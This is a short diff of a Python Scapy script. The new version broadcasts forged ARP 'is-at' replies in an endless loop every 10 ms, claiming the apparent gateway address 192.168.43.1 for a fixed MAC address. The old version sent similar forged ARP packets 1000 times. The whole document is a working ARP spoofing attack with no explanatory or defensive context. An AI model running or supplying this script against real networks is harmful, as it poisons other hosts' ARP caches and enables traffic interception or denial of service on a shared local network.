@@ -1,10 +1,16 @@
 from scapy.all import *
-import time
 
+eth = Ether()
+arp = ARP(
+    op='is-at',
 
-p = Ether(dst="ff:ff:ff:ff:ff:ff", src="f8:4d:89:6a:0c:33") / \
-    ARP(psrc="10.236.255.254")
+    hwsrc='f8:4d:89:6a:0c:33',
+    psrc='192.168.43.1',
 
-for i in range(1000):
-    sendp(p)
-    time.sleep(0.1)
+    hwdst='ff:ff:ff:ff:ff:ff',
+    pdst='192.168.43.255'
+)
+
+pkt = eth/arp
+
+sendp(pkt, iface='en0', loop=1, inter=0.01)
